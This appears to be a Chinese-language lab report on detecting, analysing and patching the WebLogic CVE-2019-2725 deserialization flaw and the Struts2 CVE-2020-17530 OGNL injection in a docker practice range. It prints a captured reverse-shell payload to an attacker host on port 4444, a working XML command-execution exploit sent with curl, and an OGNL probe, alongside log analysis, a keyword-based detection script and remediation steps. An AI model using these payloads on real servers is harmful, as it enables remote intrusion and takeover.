![alt text](img/img1/image/71289fa2d8db857ce7d227ecc3d97e8.png)

通过分析流量，可以看
到攻击者曾扫描出了三台在网段上开放的主机。

![alt text](img/img1/image/1750684623015.png)

我们选择其中一个已知存活的主机，并且使用wireshark过滤语法`ip.addr==192.170.84.2`查看其相关流量记录

![alt text](img/img1/image/1750684699496.png)


##### 1. 流量总体情况
- **源IP与目的IP**：源IP地址为192.170.84.5 ，目的IP地址为192.170.84.2 。表明流量是在这两个IP之间交互产生的。
- **协议**：从“Protocol”列看，主要是TCP协议，还有少量HTTP协议 。TCP用于建立可靠连接，HTTP是超文本传输协议，用于Web通信。

##### 2. TCP 相关分析
- **三次握手**：最初能看到SYN（同步）、SYN - ACK（同步确认）和ACK（确认）标志的包，这是TCP三次握手过程，用于建立连接。例如序号238和239的包。
- **数据传输与确认**：后续有大量带有Seq（序列号）和Ack（确认号）的包，进行数据传输和确认，确保数据按序、完整到达。
- **连接关闭**：能发现FIN（结束）标志的包，如序号1960 - 1962的包，用于发起TCP连接关闭过程。

##### 3. HTTP 相关分析
 - 出现“HTTP/1.1 404 Not Found” ，说明客户端请求的资源在服务器上未找到，可能是URL错误或资源被移除。这正巧对应我们攻击靶标时候运行显示的404错误（应用层请求了一个不存在的地址）还有“POST”请求，表明客户端向服务器提交数据。**我们重点关注一下这个POST包。**

![alt text](img/img1/image/1750685031040.png)

![alt text](img/img1/image/1750685108692.png)

通过分析，可以发现这是一个是对 WebLogic `CVE-2019-2725` 漏洞的 **远程命令执行（RCE）利用尝试**，核心内容是一个 **反弹 Shell 的 Payload**：

 **1. 请求方式**

```
POST /_async/AsyncResponseService HTTP/1.1
```

这是漏洞利用的目标接口，WebLogic 在这个接口中会反序列化请求头中的 `WorkContext`，可触发 Java 对象的执行。

**2. 请求头部**

```http
Content-Type: text/xml
SOAPAction: 
```

标准的 SOAP 协议请求头，伪装成一个合法 SOAP 请求（其实是恶意载荷）。

 **3. 请求主体（Payload）**

这是核心：

```xml
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/bash</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2">
        <string>
          bash -c '0<&36-;exec 36<>/dev/tcp/192.168.56.102/4444;sh <&36 >&36 2>&36'
        </string>
      </void>
    </array>
    <void method="start"/>
  </void>
</work:WorkContext>
```
具体解释如下：

* `192.168.56.102` 是你的攻击机（监听端）。
* `4444` 是你在攻击机上监听的端口。
* 这条命令会尝试让目标 WebLogic 服务器反连回你的机器并开启一个 Shell。

---

**4. 响应内容**

```http
HTTP/1.1 202 Accepted
```

这表示服务器成功**接收并处理了请求**，说明 SOAP 报文被成功解析，没有抛出异常。




#### 方法二：执行脚本检测漏洞
在探究方法二时，我的kali虚拟机已经无法正常在场景中启动此容器，因此使用下述指令强制启动：
```bash
docker run -d --name weblogic-cve-2019-2725 \
  --ulimit nofile=65535:65535 \
  --memory=2g \
  --memory-swap=3g \
  -p 7001:7001 \
  vulfocus/weblogic-cve_2019_2725:latest \
  /bin/bash -c "cd /root/Oracle/Middleware/user_projects/domains/base_domain && ./startWebLogic.sh && tail -f /dev/null"
```
启动后docker ps查看启动结果：

![alt text](img/img1/image/1750682067991.png)

下述脚本参考来自于`https://github.com/ludy-dev/Oracle-WLS-Weblogic-RCE`。
```py
import re
import requests
import sys
import os

# 漏洞探测函数
def exploit(dst_addr):
    # WebLogic 中两个历史存在漏洞的路径
    vuln_list = ("/_async/AsyncResponseService", "/wls-wsat/CoordinatorPortType")
    
    # 构造基础 URL（例如：http://127.0.0.1:7001）
    URL = "http://" + dst_addr

    # 遍历所有漏洞路径进行探测
    for i in vuln_list:
        print(URL + i)
        try:
            # 发送 GET 请求，5 秒超时，verify=False 是跳过 HTTPS 证书验证
            res = requests.get(URL + i, verify=False, timeout=5)
            
            # 获取响应内容与状态码
            response = res.text
            print("Status Code : %d" % res.status_code)

            # 使用正则表达式匹配响应中是否包含 WebLogic 特征关键字
            p = re.compile('elcome|eb')  # 检测 welcome 或 web
            m = p.search(response)

            # 如果匹配成功，表示该路径可能存在 WebLogic 功能 => 推测漏洞存在
            if m:
                print("Vuln Found on %s" % i)
            else:
                print("Not Found on %s" % i)

        # 捕获并输出异常信息
        except Exception as e:
            print("Error requesting %s: %s" % (i, e))

# 脚本入口
if __name__ == "__main__":
    # 如果只输入了 IP，没有端口，则默认加上 80 端口
    if len(sys.argv) == 2:
        sys.argv.append('80')
    # 如果参数不足两个（IP + 端口），提示用户使用方式
    elif len(sys.argv) < 3:
        print('Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0]))
        sys.exit()

    # 拼接目标地址为 IP:端口 的形式
    address = (sys.argv[1], sys.argv[2])
    dst_addr = ":".join(address)

    # 调用漏洞探测函数
    exploit(dst_addr)
```

在命令行运行后显示如下：

![alt text](img/img1/image/1750682119517.png)

##### 含义：

* **Status Code: 200** 表示该路径存在，且可以正常访问。
* **Vuln Found** 表示路径返回了 WebLogic 的特征响应（如包含 welcome/web 字符），因此推测目标存在 **CVE-2019-2725（远程代码执行漏洞）** 的风险。



接下来，我们创建漏洞利用 Payload 文件（XML）

用编辑器创建文件 `payload.xml`：

```bash
sudo vim payload.xml
```


复制以下内容，回车保存退出：

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id > /tmp/id.txt</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```
![alt text](img/img1/image/1750682425672.png)
---

然后，我们发送漏洞利用请求

用 `curl` 发送请求：

```bash
curl -X POST http://127.0.0.1:7001/_async/AsyncResponseService \
  -H "Content-Type: text/xml" \
  -d @payload.xml
```

![alt text](img/img1/image/1750682458575.png)
---

接下来我们进入容器检查命令执行结果

```bash
docker exec -it weblogic-cve-2019-2725 /bin/bash
```

进入容器后，查看 `/tmp/id.txt` 文件：

```bash
cat /tmp/id.txt
```

![alt text](img/img1/image/1750682716874.png)

### DMZ第二层靶标利用检测
（第三层靶标应该可以通过tcp.port==4444进行流量监测，但是我的抓包文件中在这里似乎没能正常记录下来，而且在后续weblogic容器一直无法正常启动，所以选择尝试单独启动此容器进行分析）

#### 方法一：流量检测
通过`tcp.port==4444`过滤语法应该能看到一系列有关第二层靶标攻击的流量。选择追踪流能看到执行的相应指令。

![alt text](img/img1/image/image-38.png)

即为我们在这里执行的一系列curl指令，应该会在ip_adrr==（跳板机）并且tcp.port=4444的过滤条件下显示出来。

我们重新单独启动容器，并运行之前的指令尝试获取flag，可以在wireshark上看到流量监测记录。


![alt text](img/img1/image/766dc35dc9c3e211f7bb95fbc02322e.png)

#### 方法二：查看容器内的 Nginx 日志
进入容器内部：
```bash
docker exec -it 25c8b2739921 /bin/bash
```
查找日志路径：
```bash
find /var/log -name "access.log"
```
然后执行：
```bash
tail -f /var/log/nginx/access.log
```
可以选择配合 grep 使用，过滤出关键信息：
```bash
tail -f /var/log/nginx/access.log | grep "cmd="
```

![alt text](img/img1/image/1750693783312.png)

你抓到的这些日志，**恰好就是典型的命令执行漏洞被利用的证据**，下面我来详细分析每一部分的含义，并说明这在“漏洞利用检测”中的意义。

**日志结构解析**

以这一条为例：

```
192.168.56.116 - - [23/Jun/2025:15:34:56 +0000] "GET /index.php?cmd=ls%20/tmp HTTP/1.1" 200 79 "-" "curl/8.13.0"
```

**字段说明：**

| 字段                             | 含义                                |
| ------------------------------ | --------------------------------- |
| `192.168.56.116`               | 发起请求的客户端 IP（攻击者或测试者）              |
| `23/Jun/2025:15:34:56`         | 请求时间                              |
| `GET /index.php?cmd=ls%20/tmp` | 访问路径，带有 `cmd=ls /tmp`，这是命令执行的入口点  |
| `200`                          | 返回状态码（200 表示成功）                   |
| `79`                           | 返回内容字节数                           |
| `curl/8.13.0`                  | User-Agent，说明使用了命令行工具 `curl` 发起请求 |



**安全分析结论**

| 检测点           | 结果                                     |
| ------------- | -------------------------------------- |
| 是否有命令执行行为     | ✅ 有，路径中包含 `?cmd=`，并返回 `200`            |
| 是否有人尝试读取 flag | ✅ 有，`cmd=ls /tmp` 就是常见的读取 flag 或后门路径行为 |
| 是否有外部访问尝试     | ✅ 有来自 `111.249.177.162` 的扫描行为          |
| 利用工具          | 有人用 `curl`、有人用浏览器发起                    |


#### 方法三：编写一个轻量检测脚本（Python）

>**实时检测 Nginx 日志中是否出现命令执行的可疑请求，例如访问了 `/index.php?cmd=...`，或尝试读取 `/tmp/flag` 文件。**

---
我们用 Python 编写一个脚本，它会：

1. **持续读取 Nginx 日志文件（access.log）**
2. **识别是否有请求中包含关键参数，如 `cmd=`, `cat`, `flag`, `/tmp` 等**
3. **发现可疑请求后立即在终端提示（或者写入日志、报警等）**

---
**步骤详解**

第 1 步：进入容器或挂载日志

你可以在容器里运行脚本，也可以把日志挂载到宿主机路径（比如 `/tmp/nginx-access.log`），示例：

```bash
docker run -d -p 51653:80 -v /tmp/nginx:/var/log/nginx c4pr1c3/vulshare_nginx-php-flag:latest
```

这样就能在宿主机用 Python 读 `/tmp/nginx/access.log`

---

第 2 步：创建 Python 脚本

创建一个名为 `detect_rce.py` 的文件，内容如下：

```python
import time

# 日志文件路径：根据容器/宿主机实际情况修改
log_file = "/var/log/nginx/access.log"   # 容器内部路径
# log_file = "/tmp/nginx/access.log"     # 宿主机挂载路径（可选）

# 你要监控的关键词
keywords = ["cmd=", "cat", "flag", "/tmp", "whoami", "nc", "bash", "id"]

print("[*] 正在实时监控访问日志是否有命令执行请求...")

# 打开日志文件，定位到最后一行
with open(log_file, "r") as f:
    f.seek(0, 2)  # 定位到文件末尾

    while True:
        line = f.readline()
        if not line:
            time.sleep(0.5)
            continue
        # 检查是否包含关键词
        if any(keyword in line for keyword in keywords):
            print("\n[!!!] 可疑请求检测到！")
            print("原始日志:", line.strip())
```

---

第 3 步：运行脚本

进入容器或在宿主机运行：

```bash
python3 detect_rce.py
```

一旦有人访问了：

```
http://<ip>:51653/index.php?cmd=cat /tmp/flag
```

会立刻看到输出：

```
[!!!] 可疑请求检测到！
原始日志: 192.168.56.116 - - [23/Jun/2025:15:42:02 +0000] "GET /index.php?cmd=cat%20/tmp/flag HTTP/1.1" ...
```

---

![alt text](img/img1/image/1750694303408.png)


## 漏洞修复
weblogic-CVE-2019-2725漏洞修复方案

* Weblogic-cve-2019-2725的漏洞源于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。

1. 禁⽤bea_wls9_async_response组件；

2. 删除wls9_async_response的war包并重启 ；

3. 禁⽌访问 /_async/* 路径

4. 升级本地JDK版本

* 查阅官方文档，可以看到官方发布的补丁包

[cve-2019-2725补丁](https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html?from=timeline) 

* 一、漏洞背景与影响

CVE-2019-2725是Oracle WebLogic Server中的一个高危漏洞，属于反序列化远程命令执行漏洞。该漏洞影响WebLogic的`wls9_async`和`wls-wsat`组件，攻击者可以通过发送精心构造的HTTP请求，在未经授权的情况下远程执行命令。这可能导致攻击者完全控制服务器，植入恶意软件，甚至进行横向渗透。

#### 1.入口漏洞缓解

该入口靶标所含有的CVE-2020-17530漏洞是一个OGNL表达式注入漏洞。攻击者可以通过构造恶意的OGNL表达式来执行任意代码。

1. 验证漏洞

![](img/img3/img/发现入口.png)
构造一个OGNL表达式注入漏洞
```
curl "http://localhost:60221/?id=%25%7B'test'%2B(2000%2B20)%7D"
```

URL 解码后的实际内容：
```
%{ 'test' + (2000 + 20) }
```
当参数值包含` %{...} `时，Struts2 会尝试解析其中的 OGNL 表达式。

如果漏洞存在，服务器会执行这个表达式，响应中会包含计算结果 test2020（或变体）。

如果漏洞已修复，表达式不会被执行，会返回原始字符串或错误。
![](img/img3/img/curl攻击成功.png)
```
<html>
<head>
    <title>S2-059 demo</title>

</head>
<body>
<a id="test200020" href="/.action;jsessionid=node0ml3zx3ufsgt9yndyooig9yb60.node0">your input id: %{'test'+(2000+20)}
    <br>has ben evaluated again in id attribute</a>
</body>
</html>
```
`id="test200020`表明用户命令已被执行，漏洞利用成功。

2. 分析漏洞触发点并进行修复

禁用 OGNL 表达式的缓解方式需要修改前端 JSP 页面或者配置文件，以避免不安全的 %{} 表达式被解析执行，尤其是用户可控的内容被嵌入到 %{} 中时最危险。
所以进入该容器内部，查找是否有jsp相关文件，对它进行修改：
![](img/img3/img/发现更改.png)
修改前：
![](img/img3/img/修改前的index.jp.png)

修改 JSP 文件，将原本的 **危险表达式**：

```jsp
<s:a id="%{id}">
```

改成了安全的：

```jsp
<a id="${id}" href="#">
```

这就 **彻底杜绝了 S2-059 / CVE-2020-17530 漏洞的入口**，因为不再触发 `%{}` 的 OGNL 解析。

修改后：
![](img/img3/img/修改后的index.jp.png)

3. 验证修复后的结果

重启容器，再curl一次。
现在的响应结果：

```
<html>
<head>
    <title>S2-059 demo</title>

</head>
<body>

<a id="%{'test'+(2000+20)}" href="#">your input id: %{'test'+(2000+20)}
    <br>has been rendered safely without OGNL evaluation
</a>
</body>
</html>

```
可以看出：

* 原本应该触发 OGNL 表达式执行 的 payload，现在没有被执行；
* `id="%{'test'+(2000+20)}"`说明 `id` 参数中的恶意表达式已经被安全地当作普通字符串处理，而不是被 OGNL 解析执行；
![](img/img3/img/修复成功页面.png)
表明漏洞缓解成功。

#### 2、其余漏洞缓解

修复该漏洞的核心方法是禁用或删除受影响的组件，并重启WebLogic服务。以下是具体步骤：

1. **定位受影响的文件**

根据WebLogic版本，受影响的文件和路径如下：
 **10.3.x版本**：
路径：`\Middleware\wlserver_10.3\server\lib\`
文件：`wls9_async_response.war` 和 `wls-wsat.war`
相关临时文件夹：`%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\` 和 `%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\`
**12.1.3版本**：
路径：`\Middleware\Oracle_Home\oracle_common\modules\`
文件：`wls9_async_response.war` 和 `wls-wsat.war`

![](img/img2/pics/定位相关文件1.png)
![](img/img2/pics/定位漏洞文件2.png)

2. **删除受影响的文件**

删除`wls9_async_response.war`和`wls-wsat.war`文件及相关文件夹。
注意：删除文件后，确保备份重要数据，以防误删。

![](img/img2/pics/删除相关文件1.png)
![](img/img2/pics/删除相关文件2.png)
![](img/img2/pics/删除相关文件3.png)

3. **重启WebLogic服务**

删除文件后，重启WebLogic服务以使更改生效。
在Docker环境中，可以通过以下命令重启服务：

```bash
 docker restart <容器名称>
```

![](img/img2/pics/删除相关文件4.png)

4. **验证修复效果**

- 再次访问检测路径（如`/_async/AsyncResponseService`），如果返回404或403错误，则说明修复成功。

![](img/img2/pics/修复后1.png)
![](img/img2/pics/修复后2.png)

和修复前对比
![](img/img2/pics/修复前1.png)
![](img/img2/pics/修复前2.png)

* 注意事项与建议

1. **备份重要数据**：
   - 在执行删除操作前，请确保对重要数据进行备份，以防误操作导致数据丢失。
2. **使用官方补丁**：
   - 如果无法删除受影响的组件，可以考虑应用Oracle官方发布的补丁
3. **限制访问权限**：
   - 在修复漏洞后，建议限制对WebLogic服务的访问权限，仅允许授权IP访问。
4. **监控异常行为**：
   - 使用日志监控工具（如ELK Stack）监控WebLogic服务器的日志，及时发现异常行为。

## 参考资料

[WebLogic漏洞复现（附带修复方法）_weblogic漏洞修复](https://blog.csdn.net/Python84310366/article/details/148626907)
[网络安全攻防实践](https://github.com/Xuyan-cmd/Network-security-attack-and-defense-practice/blob/main/README.md)
[Weblogic反序列化远程命令执行漏洞 CVE-2019-2725 详解 - CSDN博客](https://blog.csdn.net/m0_67544876/article/details/147928201)
[WebLogic反序列化漏洞(CVE-2019-2725补丁绕过) - 博客园](https://www.cnblogs.com/paperpen/p/11043182.html)
